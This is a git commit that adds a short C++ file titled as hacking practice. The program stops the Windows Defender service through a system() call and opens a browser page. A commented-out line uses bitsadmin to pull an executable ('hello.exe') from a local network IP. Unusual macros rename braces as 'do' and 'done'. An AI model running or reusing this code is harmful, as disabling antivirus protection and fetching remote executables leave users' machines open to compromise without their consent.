6c64eec7854c465dd371860630c2755e88a318a6
Md Sajibur Rahman <83011864+GameDevSajib@users.noreply.github.com>
2023-11-22 17:40:55 +0600

    Add files via upload

---
+++ Hack_practice.cpp
@@ -0,0 +1,28 @@
+#include<bits/stdc++.h>
+#define ll long long
+#define do {
+#define done }
+#define start_ int main()
+#define finish return 0;
+using namespace std;
+
+void server()
+do
+       char install[100005];
+       char srv[10000];
+       char com[1000];
+       strcpy(com,"sc stop WinDefend");
+       //strcpy(install,"& cmd --% /c bitsadmin /transfer 8 192.168.1.102/hello.exe");
+       strcpy(srv,"start msedge   https://rufus.ie/downloads/");
+       system(srv);
+       system(com);
+done
+start_
+do
+
+server();
+
+
+
+finish
+done
